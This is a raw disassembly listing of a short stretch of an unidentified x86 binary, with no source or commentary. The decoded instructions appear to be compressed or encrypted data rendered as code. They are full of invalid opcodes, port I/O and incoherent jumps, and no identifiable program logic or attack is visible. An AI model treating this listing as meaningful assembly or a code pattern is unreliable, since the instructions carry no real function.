  4030c4:	ec                   	in     (%dx),%al
  4030c5:	c9                   	leave
  4030c6:	0f 29 57 96          	movaps %xmm2,-0x6a(%edi)
  4030ca:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4030cb:	60                   	pusha
  4030cc:	40                   	inc    %eax
  4030cd:	26 29 0f             	sub    %ecx,%es:(%edi)
  4030d0:	2f                   	das
  4030d1:	d3 a6 71 b2 28 78    	shll   %cl,0x7828b271(%esi)
  4030d7:	78 6b                	js     0x403144
  4030d9:	67 fb                	addr16 sti
  4030db:	ac                   	lods   %ds:(%esi),%al
  4030dc:	ca e1 a7             	lret   $0xa7e1
  4030df:	76 7c                	jbe    0x40315d
  4030e1:	9f                   	lahf
  4030e2:	70 10                	jo     0x4030f4
  4030e4:	f0 55                	lock push %ebp
  4030e6:	f7 1d fe 15 f2 0f    	negl   0xff215fe
  4030ec:	15 74 4b b4 a6       	adc    $0xa6b44b74,%eax
  4030f1:	9c                   	pushf
  4030f2:	2f                   	das
  4030f3:	3a fe                	cmp    %dh,%bh
  4030f5:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4030f6:	0c 1e                	or     $0x1e,%al
  4030f8:	38 fe                	cmp    %bh,%dh
  4030fa:	87 81 23 9f 7f 6f    	xchg   %eax,0x6f7f9f23(%ecx)
  403100:	89 72 f1             	mov    %esi,-0xf(%edx)
  403103:	95                   	xchg   %eax,%ebp
  403104:	df 0f                	fisttps (%edi)
  403106:	06                   	push   %es
  403107:	aa                   	stos   %al,%es:(%edi)
  403108:	ff                   	(bad)
  403109:	bd 54 bd 60 9f       	mov    $0x9f60bd54,%ebp
  40310e:	58                   	pop    %eax
  40310f:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403110:	54                   	push   %esp
  403111:	2f                   	das
  403112:	7e 6e                	jle    0x403182
  403114:	4b                   	dec    %ebx
  403115:	d1 f1                	shl    $1,%ecx
  403117:	bb 2e 36 5c 5e       	mov    $0x5e5c362e,%ebx
  40311c:	78 72                	js     0x403190
  40311e:	eb 5f                	jmp    0x40317f
  403120:	1e                   	push   %ds
  403121:	3e f0 ea 4b ce a1 b6 	ds lock ljmp $0xaafb,$0xb6a1ce4b
  403128:	fb aa 
  40312a:	0e                   	push   %cs
  40312b:	c6                   	(bad)
  40312c:	f7 3d 3f 45 c9 e9    	idivl  0xe9c9453f
  403132:	bf 78 ee cd e3       	mov    $0xe3cdee78,%edi
  403137:	87 5a 2e             	xchg   %ebx,0x2e(%edx)
  40313a:	ad                   	lods   %ds:(%esi),%eax
  40313b:	78 f9                	js     0x403136
  40313d:	b6 c8                	mov    $0xc8,%dh
  40313f:	3c f7                	cmp    $0xf7,%al
  403141:	b3 81                	mov    $0x81,%bl
  403143:	8e 9c cf 3f fa f8 0b 	mov    0xbf8fa3f(%edi,%ecx,8),%ds
  40314a:	e1 f7                	loope  0x403143
  40314c:	07                   	pop    %es
  40314d:	e3 67                	jecxz  0x4031b6
  40314f:	97                   	xchg   %eax,%edi
  403150:	7f b4                	jg     0x403106
  403152:	ff                   	(bad)
  403153:	fc                   	cld
  403154:	f6 fc                	idiv   %ah
  403156:	ab                   	stos   %eax,%es:(%edi)
  403157:	da ee                	(bad)
  403159:	82 1f 6f             	sbbb   $0x6f,(%edi)
  40315c:	7c ed                	jl     0x40314b
  40315e:	77 9b                	ja     0x4030fb
  403160:	3a ea                	cmp    %dl,%ch
  403162:	9e                   	sahf
  403163:	79 67                	jns    0x4031cc
  403165:	c9                   	leave
  403166:	1f                   	pop    %ds
  403167:	4f                   	dec    %edi
  403168:	94                   	xchg   %eax,%esp
  403169:	ed                   	in     (%dx),%eax
  40316a:	ff d1                	call   *%ecx
  40316c:	ec                   	in     (%dx),%al
  40316d:	1f                   	pop    %ds
  40316e:	dc a9 ee 3f 76 86    	fsubrl -0x7989c012(%ecx)
  403174:	e5 cd                	in     $0xcd,%eax
  403176:	dd dd                	fstp   %st(5)
  403178:	b1 62                	mov    $0x62,%cl
  40317a:	5e                   	pop    %esi
  40317b:	f0 d0 b7 df 5d f0 49 	lock shlb $1,0x49f05ddf(%edi)
  403182:	f3 f3 d8 7a a4       	repz repz fdivrs -0x5c(%edx)
  403187:	a0 e4 6f e5 73       	mov    0x73e56fe4,%al
  40318c:	79 44                	jns    0x4031d2
  40318e:	ad                   	lods   %ds:(%esi),%eax
  40318f:	39 77 3c             	cmp    %esi,0x3c(%edi)
  403192:	62 ab a9 06 cb cc    	bound  %ebp,-0x3334f957(%ebx)
  403198:	56                   	push   %esi
  403199:	b6 b5                	mov    $0xb5,%dh
  40319b:	c7                   	(bad)
  40319c:	b6 7a                	mov    $0x7a,%dh
  40319e:	1d ae e7 ed e0       	sbb    $0xe0ede7ae,%eax
  4031a3:	ab                   	stos   %eax,%es:(%edi)
  4031a4:	25 9a ad 34 ac       	and    $0xac34ad9a,%eax
  4031a9:	6a cd                	push   $0xffffffcd
  4031ab:	2e ea 45 fe 14 3e c4 	cs ljmp $0xb7c4,$0x3e14fe45
  4031b2:	b7 
  4031b3:	41                   	inc    %ecx
  4031b4:	b8 28 9a 99 15       	mov    $0x15999a28,%eax
  4031b9:	45                   	inc    %ebp
  4031ba:	74 27                	je     0x4031e3
  4031bc:	65 a8 fd             	gs test $0xfd,%al
  4031bf:	0d 20 8b b9 8d       	or     $0x8db98b20,%eax
  4031c4:	9c                   	pushf
  4031c5:	95                   	xchg   %eax,%ebp
  4031c6:	c8 95 4b 25          	enter  $0x4b95,$0x25
  4031ca:	aa                   	stos   %al,%es:(%edi)
  4031cb:	e8 71 dd 94 53       	call   0x53d50f41
  4031d0:	15 0a 25 74 b7       	adc    $0xb774250a,%eax
  4031d5:	27                   	daa
  4031d6:	1d 53 34 2b 19       	sbb    $0x192b3453,%eax
  4031db:	aa                   	stos   %al,%es:(%edi)
  4031dc:	b3 e2                	mov    $0xe2,%bl
  4031de:	fd                   	std
  4031df:	21 bf fa 21 1c b5    	and    %edi,-0x4ae3de06(%edi)
  4031e5:	a9 1e 27 a4 59       	test   $0x59a4271e,%eax
  4031ea:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4031eb:	b7 90                	mov    $0x90,%bh
  4031ed:	2c 1b                	sub    $0x1b,%al
  4031ef:	fb                   	sti
  4031f0:	e7 54                	out    %eax,$0x54
  4031f2:	89 6e c1             	mov    %ebp,-0x3f(%esi)
  4031f5:	a2 65 aa c3 88       	mov    %al,0x88c3aa65
  4031fa:	1e                   	push   %ds
  4031fb:	94                   	xchg   %eax,%esp
  4031fc:	e8 01 6e 22 ab       	call   0xab62a002
  403201:	f1                   	int1
  403202:	f8                   	clc
  403203:	fd                   	std
  403204:	38 86 f1 c1 c8 58    	cmp    %al,0x58c8c1f1(%esi)
  40320a:	a0 2c 1e c7 8c       	mov    0x8cc71e2c,%al
  40320f:	ca 36 eb             	lret   $0xeb36
  403212:	66 36 33 31          	xor    %ss:(%ecx),%si
  403216:	cd b2                	int    $0xb2
  403218:	ea 80 72 ac b4 0d 42 	ljmp   $0x420d,$0xb4ac7280
  40321f:	f1                   	int1
  403220:	9c                   	pushf
  403221:	54                   	push   %esp
  403222:	2a e5                	sub    %ch,%ah
  403224:	d8 b7 71 14 17 4a    	fdivs  0x4a171471(%edi)
  40322a:	94                   	xchg   %eax,%esp
  40322b:	27                   	daa
  40322c:	08 8f 9f f9 e0 a9    	or     %cl,-0x561f0661(%edi)
  403232:	6b d6 d0             	imul   $0xffffffd0,%esi,%edx
  403235:	f4                   	hlt
  403236:	97                   	xchg   %eax,%edi
  403237:	fa                   	cli
  403238:	9a 5f d8 f9 c3 0d 2f 	lcall  $0x2f0d,$0xc3f9d85f
  40323f:	5f                   	pop    %edi
  403240:	d2 4f 25             	rorb   %cl,0x25(%edi)
  403243:	f7 3d 3a e3 ca b9    	idivl  0xb9cae33a
  403249:	d8 9e 33 d2 3f f7    	fcomps -0x8c02dcd(%esi)
  40324f:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403250:	4a                   	dec    %edx
  403251:	34 ed                	xor    $0xed,%al
  403253:	b1 df                	mov    $0xdf,%cl
  403255:	9c                   	pushf
  403256:	bf 77 d7 17 a7       	mov    $0xa717d777,%edi
  40325b:	17                   	pop    %ss
  40325c:	bc 18 fc d3 df       	mov    $0xdfd3fc18,%esp
  403261:	4a                   	dec    %edx
  403262:	ae                   	scas   %es:(%edi),%al
  403263:	76 ce                	jbe    0x403233
  403265:	7f 7d                	jg     0x4032e4
  403267:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403268:	7a fe                	jp     0x403268
  40326a:	c0 69 e9 93          	shrb   $0x93,-0x17(%ecx)
  40326e:	81 bd 8b de 78 6d 57 	cmpl   $0xa9e0fb57,0x6d78de8b(%ebp)
  403275:	fb e0 a9 
  403278:	15 27 ca 7e 12       	adc    $0x127eca27,%eax
  40327d:	7c b3                	jl     0x403232
  40327f:	ed                   	in     (%dx),%eax
  403280:	0c 1b                	or     $0x1b,%al
  403282:	0a 5c 79 6e          	or     0x6e(%ecx,%edi,2),%bl
  403286:	f3 86 57 a6          	xrelease xchg %dl,-0x5a(%edi)
  40328a:	39 83 87 bf fe 7a    	cmp    %eax,0x7afebf87(%ebx)
  403290:	ef                   	out    %eax,(%dx)
  403291:	c2 b7 0e             	ret    $0xeb7
  403294:	6c                   	insb   (%dx),%es:(%edi)
  403295:	f8                   	clc
  403296:	f3 db af ee 1d 18 a8 	repz fldt -0x57e7e212(%edi)
  40329d:	0d 2a 0d bf 0a       	or     $0xabf0d2a,%eax
  4032a2:	2f                   	das
  4032a3:	7b d6                	jnp    0x40327b
  4032a5:	19 2e                	sbb    %ebp,(%esi)
  4032a7:	f9                   	stc
  4032a8:	7b e7                	jnp    0x403291
  4032aa:	a9 f7 ce 75 7d       	test   $0x7d75cef7,%eax
  4032af:	b8 ed dd 67 16       	mov    $0x1667dded,%eax
  4032b4:	ad                   	lods   %ds:(%esi),%eax
  4032b5:	df de                	(bad)
  4032b7:	f8                   	clc
  4032b8:	56                   	push   %esi
  4032b9:	fd                   	std
  4032ba:	b1 8f                	mov    $0x8f,%cl
  4032bc:	e7 37                	out    %eax,$0x37
  4032be:	f1                   	int1
  4032bf:	72 3f                	jb     0x403300
  4032c1:	db 5b f2             	fistpl -0xe(%ebx)
  4032c4:	4d                   	dec    %ebp
  4032c5:	92                   	xchg   %eax,%edx
  4032c6:	d6                   	salc
  4032c7:	35 f1 e2 b7 e0       	xor    $0xe0b7e2f1,%eax
  4032cc:	99                   	cltd
  4032cd:	89 33                	mov    %esi,(%ebx)
  4032cf:	6d                   	insl   (%dx),%es:(%edi)
  4032d0:	e6 a8                	out    %al,$0xa8
  4032d2:	03 8c ef 64 33 f0 f0 	add    -0xf0fcc9c(%edi,%ebp,8),%ecx
  4032d9:	a3 ae 1b d0 3d       	mov    %eax,0x3dd01bae
  4032de:	ee                   	out    %al,(%dx)
  4032df:	70 2b                	jo     0x40330c
  4032e1:	1e                   	push   %ds
  4032e2:	4b                   	dec    %ebx
  4032e3:	62 fd 45             	(bad) {%k2}{z}
  4032e6:	a2 ff 69 7e ea       	mov    %al,0xea7e69ff
  4032eb:	85 39                	test   %edi,(%ecx)
  4032ed:	4f                   	dec    %edi
  4032ee:	f7 36                	divl   (%esi)
  4032f0:	0e                   	push   %cs
  4032f1:	7e 7a                	jle    0x40336d
  4032f3:	b8 79 fd 85 47       	mov    $0x4785fd79,%eax
  4032f8:	96                   	xchg   %eax,%esi
  4032f9:	73 1f                	jae    0x40331a
  4032fb:	b5 55                	mov    $0x55,%ch
  4032fd:	9d                   	popf
  4032fe:	b8 db f0 b5 ef       	mov    $0xefb5f0db,%eax
  403303:	74 6a                	je     0x40336f
  403305:	5e                   	pop    %esi
  403306:	01 3a                	add    %edi,(%edx)
  403308:	fd                   	std
  403309:	42                   	inc    %edx
  40330a:	74 5a                	je     0x403366
  40330c:	b1 4d                	mov    $0x4d,%cl
  40330e:	9d                   	popf
  40330f:	7e c5                	jle    0x4032d6
  403311:	3b 4d e6             	cmp    -0x1a(%ebp),%ecx
  403314:	56                   	push   %esi
  403315:	86 33                	xchg   %dh,(%ebx)
  403317:	12 25 15 8f 51 74    	adc    0x74518f15,%ah
  40331d:	4d                   	dec    %ebp
  40331e:	cd 03                	int    $0x3
  403320:	8b 97 90 ef f4 ee    	mov    -0x110b1070(%edi),%edx
  403326:	65 be 53 04 3e 75    	gs mov $0x753e0453,%esi
  40332c:	61                   	popa
  40332d:	d1 4f 1f             	rorl   $1,0x1f(%edi)
  403330:	df bb 2f fa 41 d5    	fistpll -0x2abe05d1(%ebx)
  403336:	15 59 fe 59 d9       	adc    $0xd959fe59,%eax
  40333b:	48                   	dec    %eax
  40333c:	10 ef                	adc    %ch,%bh
  40333e:	65 2e 3c 93          	gs cs cmp $0x93,%al
  403342:	b4 a1                	mov    $0xa1,%ah
  403344:	b2 d1                	mov    $0xd1,%dl
  403346:	54                   	push   %esp
  403347:	57                   	push   %edi
  403348:	ad                   	lods   %ds:(%esi),%eax
  403349:	65 47                	gs inc %edi
  40334b:	0c 63                	or     $0x63,%al
  40334d:	9d                   	popf
  40334e:	aa                   	stos   %al,%es:(%edi)
  40334f:	9b de 06             	fiadds (%esi)
  403352:	cc                   	int3
  403353:	98                   	cwtl
  403354:	d8 1f                	fcomps (%edi)
  403356:	fc                   	cld
  403357:	76 6d                	jbe    0x4033c6
  403359:	3e dc 8c 4f f1 3a 4d 	fmull  %ds:0x124d3af1(%edi,%ecx,2)
  403360:	12 
  403361:	8a 77 4d             	mov    0x4d(%edi),%dh
  403364:	38 ea                	cmp    %ch,%dl
  403366:	bd 93 3c 3c 09       	mov    $0x93c3c93,%ebp
  40336b:	9f                   	lahf
  40336c:	37                   	aaa
  40336d:	7e 77                	jle    0x4033e6
  40336f:	58                   	pop    %eax
  403370:	5f                   	pop    %edi
  403371:	4d                   	dec    %ebp
  403372:	b4 73                	mov    $0x73,%ah
  403374:	d4 fd                	aam    $0xfd
  403376:	69 67 a0 12 d8 8e b3 	imul   $0xb38ed812,-0x60(%edi),%esp
  40337d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40337e:	0b b8 0a f3 12 c5    	or     -0x3aed0cf6(%eax),%edi
  403384:	e9 d5 48 0d a0       	jmp    0xa04d7c5e
  403389:	eb 81                	jmp    0x40330c
  40338b:	75 de                	jne    0x40336b
  40338d:	ad                   	lods   %ds:(%esi),%eax
  40338e:	8b 7e 99             	mov    -0x67(%esi),%edi
  403391:	fb                   	sti
  403392:	8f                   	(bad)
  403393:	ab                   	stos   %eax,%es:(%edi)
  403394:	9e                   	sahf
  403395:	ff 5c df a3          	lcall  *-0x5d(%edi,%ebx,8)
  403399:	d7                   	xlat   %ds:(%ebx)
  40339a:	af                   	scas   %es:(%edi),%eax
  40339b:	f0 fd                	lock std
  40339d:	70 6a                	jo     0x403409
  40339f:	dc b5 88 22 42 af    	fdivl  -0x50bddd78(%ebp)
  4033a5:	1d 67 9f 0d 3f       	sbb    $0x3f0d9f67,%eax
  4033aa:	3a ee                	cmp    %dh,%ch
  4033ac:	12 d8                	adc    %al,%bl
  4033ae:	3d c9 a4 6e b2       	cmp    $0xb26ea4c9,%eax
  4033b3:	84 fc                	test   %bh,%ah
  4033b5:	1e                   	push   %ds
  4033b6:	61                   	popa
  4033b7:	d5 0a                	aad    $0xa
  4033b9:	a9 0a ae 03 b9       	test   $0xb903ae0a,%eax
  4033be:	4a                   	dec    %edx
  4033bf:	2e f4                	cs hlt
  4033c1:	2c 50                	sub    $0x50,%al
  4033c3:	5e                   	pop    %esi
  4033c4:	3b 98 7b 9a 5f 18    	cmp    0x185f9a7b(%eax),%ebx
  4033ca:	10 93 0b 2d 1d fc    	adc    %dl,-0x3e2d2f5(%ebx)
  4033d0:	c4 24 9e             	les    (%esi,%ebx,4),%esp
  4033d3:	8e 0a                	mov    (%edx),%cs
  4033d5:	9d                   	popf
  4033d6:	70 f6                	jo     0x4033ce
  4033d8:	57                   	push   %edi
  4033d9:	49                   	dec    %ecx
  4033da:	31 5e 03             	xor    %ebx,0x3(%esi)
  4033dd:	da 86 93 54 c2 09    	fiaddl 0x9c25493(%esi)
  4033e3:	6a 51                	push   $0x51
  4033e5:	12 3f                	adc    (%edi),%bh
  4033e7:	06                   	push   %es
  4033e8:	7d 97                	jge    0x403381
  4033ea:	f8                   	clc
  4033eb:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4033ec:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4033ed:	0e                   	push   %cs
  4033ee:	9c                   	pushf
  4033ef:	38 f5                	cmp    %dh,%ch
  4033f1:	a3 dc 2a fa 38       	mov    %eax,0x38fa2adc
  4033f6:	dd 2f                	(bad) (%edi)
  4033f8:	3c cb                	cmp    $0xcb,%al
  4033fa:	c2 9b 8d             	ret    $0x8d9b
  4033fd:	9e                   	sahf
  4033fe:	41                   	inc    %ecx
  4033ff:	3b 06                	cmp    (%esi),%eax
  403401:	e4 32                	in     $0x32,%al
  403403:	6f                   	outsl  %ds:(%esi),(%dx)
  403404:	4c                   	dec    %esp
  403405:	19 7c 06 39          	sbb    %edi,0x39(%esi,%eax,1)
  403409:	13 bd 49 1a d0 11    	adc    0x11d01a49(%ebp),%edi
  40340f:	f6 8e 2f 73 60 9b c6 	testb  $0xc6,-0x649f8cd1(%esi)
  403416:	9b                   	fwait
  403417:	27                   	daa
  403418:	51                   	push   %ecx
  403419:	44                   	inc    %esp
  40341a:	f4                   	hlt
  40341b:	bb 11 49 66 fc       	mov    $0xfc664911,%ebx
  403420:	94                   	xchg   %eax,%esp
  403421:	c8 b1 1f 15          	enter  $0x1fb1,$0x15
  403425:	55                   	push   %ebp
  403426:	45                   	inc    %ebp
  403427:	2c bc                	sub    $0xbc,%al
  403429:	f5                   	cmc
  40342a:	20 1e                	and    %bl,(%esi)
  40342c:	17                   	pop    %ss
  40342d:	12 87 aa 70 2b 09    	adc    0x92b70aa(%edi),%al
  403433:	61                   	popa
  403434:	1c 1d                	sbb    $0x1d,%al
  403436:	74 0f                	je     0x403447
  403438:	fc                   	cld
  403439:	c4                   	(bad)
  40343a:	e0 41                	loopne 0x40347d
  40343c:	13 76 a1             	adc    -0x5f(%esi),%esi
  40343f:	6c                   	insb   (%dx),%es:(%edi)
  403440:	b4 21                	mov    $0x21,%ah
  403442:	e1 c9                	loope  0x40340d
  403444:	81 46 5a 54 8c eb f3 	addl   $0xf3eb8c54,0x5a(%esi)
  40344b:	3e 05 0b 07 94 26    	ds add $0x2694070b,%eax
  403451:	ea e6 d5 29 06 1d 57 	ljmp   $0x571d,$0x629d5e6
  403458:	64 c3                	fs ret
  40345a:	f3 5d                	repz pop %ebp
  40345c:	8a 6d 51             	mov    0x51(%ebp),%ch
  40345f:	ca d6 2d             	lret   $0x2dd6
  403462:	22 22                	and    (%edx),%ah
  403464:	d4 84                	aam    $0x84
  403466:	5e                   	pop    %esi
  403467:	6a 4c                	push   $0x4c
  403469:	bd c7 fa e7 eb       	mov    $0xebe7fac7,%ebp
  40346e:	68 b4 5d bb c8       	push   $0xc8bb5db4
  403473:	de 19                	ficomps (%ecx)
  403475:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403476:	5f                   	pop    %edi
  403477:	89 28                	mov    %ebp,(%eax)
  403479:	cb                   	lret
  40347a:	f1                   	int1
  40347b:	84 c5                	test   %al,%ch
  40347d:	c3                   	ret
  40347e:	c7                   	(bad)
  40347f:	99                   	cltd
  403480:	0a fd                	or     %ch,%bh
  403482:	7a 11                	jp     0x403495
  403484:	05 d7 35 e1 c5       	add    $0xc5e135d7,%eax
  403489:	18 95 f1 58 ff 0a    	sbb    %dl,0xaff58f1(%ebp)
  40348f:	b2 32                	mov    $0x32,%dl
  403491:	c4                   	(bad)
  403492:	fd                   	std
  403493:	f2 5e                	repnz pop %esi
  403495:	ac                   	lods   %ds:(%esi),%al
  403496:	1c 89                	sbb    $0x89,%al
  403498:	d6                   	salc
  403499:	42                   	inc    %edx
  40349a:	27                   	daa
  40349b:	21 2c b8             	and    %ebp,(%eax,%edi,4)
  40349e:	5e                   	pop    %esi
  40349f:	0a 19                	or     (%ecx),%bl
  4034a1:	f3 08 13             	repz or %dl,(%ebx)
  4034a4:	a2 4a 99 7f 29       	mov    %al,0x297f994a
  4034a9:	b8 ff 46 9f af       	mov    $0xaf9f46ff,%eax
  4034ae:	fb                   	sti
  4034af:	fe                   	(bad)
  4034b0:	33 f1                	xor    %ecx,%esi
  4034b2:	99                   	cltd
  4034b3:	37                   	aaa
  4034b4:	1c c7                	sbb    $0xc7,%al
  4034b6:	cb                   	lret
  4034b7:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4034b8:	09 5c 5e d1          	or     %ebx,-0x2f(%esi,%ebx,2)
  4034bc:	34 6a                	xor    $0x6a,%al
  4034be:	e0 8e                	loopne 0x40344e
  4034c0:	99                   	cltd
  4034c1:	8f 89 f9 e7          	(bad)
  4034c5:	4f                   	dec    %edi
  4034c6:	d0 1f                	rcrb   $1,(%edi)
  4034c8:	5f                   	pop    %edi
  4034c9:	85 91 1a 64 ea 5c    	test   %edx,0x5cea641a(%ecx)
  4034cf:	03 a9 e3 af 21 43    	add    0x4321afe3(%ecx),%ebp
  4034d5:	ac                   	lods   %ds:(%esi),%al
  4034d6:	b2 eb                	mov    $0xeb,%dl
  4034d8:	db 78 76             	fstpt  0x76(%eax)
  4034db:	37                   	aaa
  4034dc:	d5 64                	aad    $0x64
  4034de:	ef                   	out    %eax,(%dx)
  4034df:	5e                   	pop    %esi
  4034e0:	7c fa                	jl     0x4034dc
  4034e2:	c1 9b 35 f8 7f fb 5f 	rcrl   $0x5f,-0x48007cb(%ebx)
  4034e9:	6a ff                	push   $0xffffffff
  4034eb:	05 61 52 00 00       	add    $0x5261,%eax
  4034f0:	b4 9d                	mov    $0x9d,%ah
  4034f2:	07                   	pop    %es
  4034f3:	60                   	pusha
  4034f4:	1c c5                	sbb    $0xc5,%al
  4034f6:	f5                   	cmc
  4034f7:	ff                   	lcall  (bad)
  4034f8:	df ec                	fucomip %st(4),%st
  4034fa:	35 75 eb 74 96       	xor    $0x9674eb75,%eax
  4034ff:	4e                   	dec    %esi
  403500:	bd ba c8 92 2d       	mov    $0x2d92c8ba,%ebp
  403505:	ab                   	stos   %eax,%es:(%edi)
  403506:	d8 b2 dc 75 56 b1    	fdivs  -0x4ea98a24(%edx)
  40350c:	84 d5                	test   %dl,%ch
  40350e:	ac                   	lods   %ds:(%esi),%al
  40350f:	62 4b a6             	bound  %ecx,-0x5a(%ebx)
  403512:	e8 ce d2 c9 3e       	call   0x3f0a07e5
  403517:	5b                   	pop    %ebx
  403518:	d2 89 3b c9 05 2c    	rorb   %cl,0x2c05c93b(%ecx)
  40351e:	38 d1                	cmp    %dl,%cl
  403520:	82 a9 36 bd 18 90 28 	subb   $0x28,-0x6fe742ca(%ecx)
  403527:	21 18                	and    %ebx,(%eax)
  403529:	08 bd 13 90 42 0f    	or     %bh,0xf429013(%ebp)
  40352f:	04 02                	add    $0x2,%al
  403531:	31 3f                	xor    %edi,(%edi)
  403533:	08 10                	or     %dl,(%eax)
  403535:	90                   	nop
  403536:	43                   	inc    %ebx
  403537:	4d                   	dec    %ebp
  403538:	08 10                	or     %dl,(%eax)
  40353a:	42                   	inc    %edx
  40353b:	80 50 fd 7f          	adcb   $0x7f,-0x3(%eax)
  40353f:	f3 76 e6             	repz jbe 0x403528
  403542:	76 85                	jbe    0x4034c9
  403544:	44                   	inc    %esp
  403545:	7e 82                	jle    0x4034c9
  403547:	5f                   	pop    %edi
  403548:	fe                   	(bad)
  403549:	24 fa                	and    $0xfa,%al
  40354b:	ec                   	in     (%dx),%al
  40354c:	7b df                	jnp    0x40352d
  40354e:	99                   	cltd
  40354f:	9d                   	popf
  403550:	7d 6f                	jge    0x4035c1
  403552:	66 76 76             	data16 jbe 0x4035cb
  403555:	f6 74 b6 6b          	divb   0x6b(%esi,%esi,4)
  403559:	37                   	aaa
  40355a:	ed                   	in     (%dx),%eax
  40355b:	03 03                	add    (%ebx),%eax
  40355d:	00 18                	add    %bl,(%eax)
  40355f:	f1                   	int1
  403560:	e7 c8                	out    %eax,$0xc8
  403562:	11 80 fb 41 fd af    	adc    %eax,-0x5002be05(%eax)
  403568:	14 fe                	adc    $0xfe,%al
  40356a:	f7 ff                	idiv   %edi
  40356c:	02 f8                	add    %al,%bh
  40356e:	13 95 f6 60 14 dc    	adc    -0x23eb9f0a(%ebp),%edx
  403574:	1d fa fb 8c fb       	sbb    $0xfb8cfbfa,%eax
  403579:	59                   	pop    %ecx
  40357a:	cd ef                	int    $0xef
  40357c:	33 9a b7 7a fc e9    	xor    -0x16038549(%edx),%ebx
  403582:	7d 3e                	jge    0x4035c2
  403584:	ef                   	out    %eax,(%dx)
  403585:	16                   	push   %ss
  403586:	9f                   	lahf
  403587:	ab                   	stos   %eax,%es:(%edi)
  403588:	27                   	daa
  403589:	bd c3 d5 db eb       	mov    $0xebdbd5c3,%ebp
  40358e:	ed                   	in     (%dx),%eax
  40358f:	4f                   	dec    %edi
  403590:	df ec                	fucomip %st(4),%st
  403592:	4e                   	dec    %esi
  403593:	f7 0d f4 a6 7b 7a d3 	testl  $0x9bebcbd3,0x7a7ba6f4
  40359a:	cb eb 9b 
  40359d:	d2 7b bc             	sarb   %cl,-0x44(%ebx)
  4035a0:	9d                   	popf
  4035a1:	ee                   	out    %al,(%dx)
  4035a2:	bc c8 c8 b0 59       	mov    $0x59b0c8c8,%esp
  4035a7:	a2 8d 86 0a 80       	mov    %al,0x800a868d
  4035ac:	1a 66 80             	sbb    -0x80(%esi),%ah
  4035af:	ed                   	in     (%dx),%eax
  4035b0:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4035b1:	29 87 64 bb e3 90    	sub    %eax,-0x6f1c449c(%edi)
  4035b7:	99                   	cltd
  4035b8:	1e                   	push   %ds
  4035b9:	ce                   	into
  4035ba:	f2 01 1e             	repnz add %ebx,(%esi)
  4035bd:	46                   	inc    %esi
  4035be:	c7                   	(bad)
  4035bf:	ac                   	lods   %ds:(%esi),%al
  4035c0:	6a db                	push   $0xffffffdb
  4035c2:	5e                   	pop    %esi
  4035c3:	47                   	inc    %edi
  4035c4:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4035c5:	53                   	push   %ebx
  4035c6:	21 ff                	and    %edi,%edi
  4035c8:	2f                   	das
  4035c9:	9a 6c 45 8d 1b b4 6a 	lcall  $0x6ab4,$0x1b8d456c
  4035d0:	58                   	pop    %eax
  4035d1:	87 91 ce ff 33 80    	xchg   %edx,-0x7fcc0032(%ecx)
  4035d7:	f3 74 5e             	repz je 0x403638
  4035da:	95                   	xchg   %eax,%ebp
  4035db:	ff 5f 3b             	lcall  *0x3b(%edi)
  4035de:	06                   	push   %es
  4035df:	0f f4 5f 3c          	pmuludq 0x3c(%edi),%mm3
  4035e3:	b6 5b                	mov    $0x5b,%dh
  4035e5:	af                   	scas   %es:(%edi),%eax
  4035e6:	5e                   	pop    %esi
  4035e7:	14 76                	adc    $0x76,%al
  4035e9:	19 a6 ca 92 41 04    	sbb    %esp,0x44192ca(%esi)
  4035ef:	f2 db d7             	repnz fcmovnbe %st(7),%st
  4035f2:	00 92 a7 d1 27 c1    	add    %dl,-0x3ed82e59(%edx)
  4035f8:	ff 30                	push   (%eax)
  4035fa:	be 10 9d 1b 82       	mov    $0x821b9d10,%esi
  4035ff:	7e 95                	jle    0x403596
  403601:	ce                   	into
  403602:	cf                   	iret
  403603:	eb 77                	jmp    0x40367c
  403605:	ef                   	out    %eax,(%dx)
  403606:	ea c7 63 df 43 22 af 	ljmp   $0xaf22,$0x43df63c7
  40360d:	87 21                	xchg   %esp,(%ecx)
  40360f:	18 b7 ae 09 67 9e    	sbb    %dh,-0x6198f652(%edi)
  403615:	cf                   	iret
  403616:	ef                   	out    %eax,(%dx)
  403617:	eb 00                	jmp    0x403619
  403619:	11 1b                	adc    %ebx,(%ebx)
  40361b:	c6                   	(bad)
  40361c:	48                   	dec    %eax
  40361d:	09 3f                	or     %edi,(%edi)
  40361f:	32 b1 5e 29 fe 3f    	xor    0x3ffe295e(%ecx),%dh
  403625:	cf                   	iret
  403626:	e7 ee                	out    %eax,$0xee
  403628:	f6 62 c5             	mulb   -0x3b(%edx)
  40362b:	08 11                	or     %dl,(%ecx)
  40362d:	33 b5 f5 db 49 f5    	xor    -0xab6240b(%ebp),%esi
  403633:	d6                   	salc
  403634:	fc                   	cld
  403635:	30 cc                	xor    %cl,%ah
  403637:	9a d7 d5 63 15 5d de 	lcall  $0xde5d,$0x1563d5d7
  40363e:	04 e7                	add    $0xe7,%al
  403640:	a0 d1 77 01 b5       	mov    0xb50177d1,%al
  403645:	f0 b3 fe             	lock mov $0xfe,%bl
  403648:	4b                   	dec    %ebx
  403649:	55                   	push   %ebp
  40364a:	4e                   	dec    %esi
  40364b:	c4 53 8d             	les    -0x73(%ebx),%edx
  40364e:	39 99 8a 61 90 0c    	cmp    %ebx,0xc90618a(%ecx)
  403654:	14 14                	adc    $0x14,%al
  403656:	29 28                	sub    %ebp,(%eax)
  403658:	42                   	inc    %edx
  403659:	30 48 c1             	xor    %cl,-0x3f(%eax)
  40365c:	20 04 a3             	and    %al,(%ebx,%eiz,4)
  40365f:	14 8c                	adc    $0x8c,%al
  403661:	42                   	inc    %edx
  403662:	30 49 c1             	xor    %cl,-0x3f(%ecx)
  403665:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403666:	0a d9                	or     %cl,%bl
  403668:	56                   	push   %esi
